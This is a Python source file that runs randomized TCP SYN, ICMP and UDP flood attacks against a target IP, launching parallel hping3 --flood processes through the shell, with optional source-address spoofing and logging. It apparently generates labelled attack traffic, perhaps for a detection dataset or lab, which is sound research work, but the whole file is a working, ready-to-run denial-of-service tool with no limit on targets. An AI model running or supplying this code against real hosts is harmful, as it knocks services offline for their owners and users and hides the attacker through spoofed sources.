from utils import log_message
import random
import time
import subprocess


def attack_window(target: str, log_file=None, running=None):
    """Execute a window of attack traffic with random attack type selection.

    Similar to regular_traffic_window but for attack traffic.
    Randomly selects between TCP SYN, ICMP, and UDP floods during the window.

    Args:
        target: Target IP address
        log_file: Optional log file path
        running: Optional threading.Event or similar flag to check if should continue
    """
    attack_functions = [
        tcp_syn_flood,
        icmp_flood,
        udp_flood
    ]
    attack_func = random.choice(attack_functions)
    log_message("!!! Starting ATTACK window {}".format(attack_func.__name__), log_file)

    window_duration = random.randint(30, 120)
    start_time = time.time()

    while (time.time() - start_time) < window_duration:
        # Check running flag if provided
        if running is not None and not running:
            log_message("ATTACK: stopping due to running flag", log_file)
            break

        try:
            # call with log_file so the function logs details
            log_message("ATTACK: selected attack function: {}".format(attack_func.__name__), log_file)

            # Random short duration for this attack burst (10-30 seconds)
            burst_duration = random.randint(10, 30)
            attack_func(target, duration=burst_duration, log_file=log_file)
        except Exception as e:
            log_message("Error in attack generation: {0}".format(e), log_file)

        # Random sleep between operations and log it
        sleep_time = random.uniform(0, 0.5)
        log_message("ATTACK: sleeping for {:.2f}s".format(sleep_time), log_file)
        time.sleep(sleep_time)

    log_message("!!! Ending ATTACK window {}".format(attack_func.__name__), log_file)


def icmp_flood(target, duration=None, log_file=None):
    """Randomized ICMP flood attack using hping3.

    All parameters are randomized if not provided:
      - duration: seconds to run (random 10..60 by default)
      - concurrency: number of parallel hping3 processes (1..8)
      - packet_size: ICMP packet data size in bytes (56..1400)
      - rand_src: randomly choose whether to spoof source (--rand-source)
    Returns True on completion (best-effort).
    """
    if duration is None:
        duration = random.randint(10, 60)

    concurrency = random.randint(1, 8)
    packet_size = random.randint(56, 1400)
    rand_src = random.choice([False, True])
    rand_src_flag = "--rand-source" if rand_src else ""

    log_message("!!! ATTACK ICMP (randomized): duration={0}s concurrency={1} packet_size={2} rand_src={3}"
                .format(duration, concurrency, packet_size, rand_src), log_file)

    procs = []
    start_time = time.time()
    try:
        # Launch `concurrency` flood processes in parallel
        for i in range(concurrency):
            # build hping3 command for ICMP flood; --icmp sends ICMP echo requests
            cmd = "timeout {dur} hping3 --icmp --flood -d {size} {rand} {target}".format(
                dur=duration, size=packet_size, rand=rand_src_flag, target=target)

            log_message("Launching ICMP flood process [{}/{}]: {}".format(i + 1, concurrency, cmd), log_file)
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            procs.append((p, cmd))

        # Wait for duration (or until processes exit). Poll so we can be responsive.
        while time.time() - start_time < duration:
            if all(p[0].poll() is not None for p in procs):
                # all processes finished early
                log_message("All ICMP flood processes finished early", log_file)
                break
            time.sleep(0.2)

        # Log completion status of each process
        for idx, (p, cmd) in enumerate(procs):
            rc = p.poll()
            if rc is not None:
                log_message("ICMP flood process {} completed with rc={}".format(idx + 1, rc), log_file)

    except Exception as e:
        log_message("Error during randomized ICMP flood: {0}".format(e), log_file)

    finally:
        # Ensure all processes are terminated/cleaned up
        for idx, (p, cmd) in enumerate(procs):
            try:
                if p.poll() is None:
                    log_message("Terminating ICMP flood process {}".format(idx + 1), log_file)
                    p.terminate()
                    try:
                        p.wait(timeout=1)
                    except Exception:
                        log_message("Force killing ICMP flood process {}".format(idx + 1), log_file)
                        p.kill()
                # Capture any output
                try:
                    out, err = p.communicate(timeout=0.5)
                    if out:
                        out_s = out.decode('utf-8', errors='replace').strip()
                        if out_s:
                            log_message("ICMP flood STDOUT (proc {}): {}".format(idx + 1, out_s), log_file)
                    if err:
                        err_s = err.decode('utf-8', errors='replace').strip()
                        if err_s:
                            log_message("ICMP flood STDERR (proc {}): {}".format(idx + 1, err_s), log_file)
                except Exception:
                    pass
            except Exception as ex:
                log_message("Error cleaning up ICMP flood process {}: {}".format(idx + 1, ex), log_file)

    elapsed = time.time() - start_time
    log_message("!!! ATTACK COMPLETE ICMP (randomized): duration={0}s (actual={1:.2f}s) concurrency={2} "
                "packet_size={3} rand_src={4}"
                .format(duration, elapsed, concurrency, packet_size, rand_src), log_file)
    return True


def udp_flood(target, duration=None, log_file=None):
    """Randomized UDP flood across multiple ports and parallel processes.

    All parameters are randomized if not provided:
      - duration: seconds to run (random 10..60 by default)
      - ports: randomly sampled from a common port pool (1..6 ports)
      - concurrency: number of parallel hping3 processes (1..num_ports*2)
      - packet_size: UDP packet data size in bytes (100..1400)
      - rand_src: randomly choose whether to spoof source (--rand-source)
    Returns True on completion (best-effort).
    """
    if duration is None:
        duration = random.randint(10, 60)

    # Common UDP service ports
    port_pool = [53, 123, 161, 500, 1900, 5353, 137, 138, 69, 514, 520, 67, 68]

    num_ports = random.randint(1, min(6, len(port_pool)))
    ports = random.sample(port_pool, num_ports)
    concurrency = random.randint(1, max(1, num_ports * 2))
    packet_size = random.randint(100, 1400)
    rand_src = random.choice([False, True])
    rand_src_flag = "--rand-source" if rand_src else ""

    log_message("!!! ATTACK UDP (randomized): duration={0}s ports={1} concurrency={2} packet_size={3} rand_src={4}"
                .format(duration, ports, concurrency, packet_size, rand_src), log_file)

    procs = []
    start_time = time.time()
    try:
        # Launch `concurrency` flood processes in parallel. Each process picks a random port
        for i in range(concurrency):
            # choose a port for this process at random from chosen set
            port = str(random.choice(ports))

            # build hping3 command for UDP flood; --udp sends UDP packets, -d sets data size
            cmd = "timeout {dur} hping3 --udp --flood -p {port} -d {size} {rand} {target}".format(
                dur=duration, port=port, size=packet_size, rand=rand_src_flag, target=target)

            log_message("Launching UDP flood process [{}/{}]: {}".format(i + 1, concurrency, cmd), log_file)
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            procs.append((p, cmd, port))

        # Wait for duration (or until processes exit). Poll so we can be responsive.
        while time.time() - start_time < duration:
            if all(p[0].poll() is not None for p in procs):
                # all processes finished early
                log_message("All UDP flood processes finished early", log_file)
                break
            time.sleep(0.2)

        # Log completion status of each process
        for p, cmd, port in procs:
            rc = p.poll()
            if rc is not None:
                log_message("UDP flood process on port {} completed with rc={}".format(port, rc), log_file)

    except Exception as e:
        log_message("Error during randomized UDP flood: {0}".format(e), log_file)

    finally:
        # Ensure all processes are terminated/cleaned up
        for p, cmd, port in procs:
            try:
                if p.poll() is None:
                    log_message("Terminating UDP flood process on port {}".format(port), log_file)
                    p.terminate()
                    try:
                        p.wait(timeout=1)
                    except Exception:
                        log_message("Force killing UDP flood process on port {}".format(port), log_file)
                        p.kill()
                # Capture any output
                try:
                    out, err = p.communicate(timeout=0.5)
                    if out:
                        out_s = out.decode('utf-8', errors='replace').strip()
                        if out_s:
                            log_message("UDP flood STDOUT (port {}): {}".format(port, out_s), log_file)
                    if err:
                        err_s = err.decode('utf-8', errors='replace').strip()
                        if err_s:
                            log_message("UDP flood STDERR (port {}): {}".format(port, err_s), log_file)
                except Exception:
                    pass
            except Exception as ex:
                log_message("Error cleaning up UDP flood process on port {}: {}".format(port, ex), log_file)

    elapsed = time.time() - start_time
    log_message("!!! ATTACK COMPLETE UDP (randomized): duration={0}s (actual={1:.2f}s) ports={2} concurrency={3} "
                "packet_size={4} rand_src={5}"
                .format(duration, elapsed, ports, concurrency, packet_size, rand_src), log_file)
    return True


def tcp_syn_flood(target, duration=None, log_file=None):
    """Randomized TCP SYN flood across multiple ports and parallel processes.

    All parameters are randomized if not provided:
      - duration: seconds to run (random 10..60 by default)
      - ports: randomly sampled from a common port pool (1..6 ports)
      - concurrency: number of parallel hping3 processes (1..num_ports*2)
      - rand_src: randomly choose whether to spoof source (--rand-source)
    Returns True on completion (best-effort).
    """
    if duration is None:
        duration = random.randint(10, 60)

    port_pool = [80, 443, 22, 8080, 53, 25, 110, 123, 21, 445, 3389, 5900]

    num_ports = random.randint(1, min(6, len(port_pool)))
    ports = random.sample(port_pool, num_ports)
    concurrency = random.randint(1, max(1, num_ports * 2))
    rand_src = random.choice([False, True])
    rand_src_flag = "--rand-source" if rand_src else ""

    log_message("!!! ATTACK TCP SYN (randomized): duration={0}s ports={1} concurrency={2} rand_src={3}"
                .format(duration, ports, concurrency, rand_src), log_file)

    procs = []
    start_time = time.time()
    try:
        # Launch `concurrency` flood processes in parallel. Each process picks a random port
        for i in range(concurrency):
            # choose a port for this process at random from chosen set
            port = str(random.choice(ports))

            # build hping3 command; timeout wrapper ensures process ends after duration
            cmd = "timeout {dur} hping3 -S --flood -p {port} {rand} {target}".format(
                dur=duration, port=port, rand=rand_src_flag, target=target)

            log_message("Launching TCP SYN flood process [{}/{}]: {}".format(i + 1, concurrency, cmd), log_file)
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            procs.append((p, cmd, port))

        # Wait for duration (or until processes exit). Poll so we can be responsive.
        while time.time() - start_time < duration:
            if all(p[0].poll() is not None for p in procs):
                # all processes finished early
                log_message("All TCP SYN flood processes finished early", log_file)
                break
            time.sleep(0.2)

        # Log completion status of each process
        for p, cmd, port in procs:
            rc = p.poll()
            if rc is not None:
                log_message("TCP SYN flood process on port {} completed with rc={}".format(port, rc), log_file)

    except Exception as e:
        log_message("Error during randomized TCP SYN flood: {0}".format(e), log_file)

    finally:
        # Ensure all processes are terminated/cleaned up
        for p, cmd, port in procs:
            try:
                if p.poll() is None:
                    log_message("Terminating TCP SYN flood process on port {}".format(port), log_file)
                    p.terminate()
                    try:
                        p.wait(timeout=1)
                    except Exception:
                        log_message("Force killing TCP SYN flood process on port {}".format(port), log_file)
                        p.kill()
                # Capture any output
                try:
                    out, err = p.communicate(timeout=0.5)
                    if out:
                        out_s = out.decode('utf-8', errors='replace').strip()
                        if out_s:
                            log_message("TCP SYN flood STDOUT (port {}): {}".format(port, out_s), log_file)
                    if err:
                        err_s = err.decode('utf-8', errors='replace').strip()
                        if err_s:
                            log_message("TCP SYN flood STDERR (port {}): {}".format(port, err_s), log_file)
                except Exception:
                    pass
            except Exception as ex:
                log_message("Error cleaning up TCP SYN flood process on port {}: {}".format(port, ex), log_file)

    elapsed = time.time() - start_time
    log_message("!!! ATTACK COMPLETE TCP SYN (randomized): duration={0}s (actual={1:.2f}s) ports={2} concurrency={3} "
                "rand_src={4}"
                .format(duration, elapsed, ports, concurrency, rand_src), log_file)
    return True
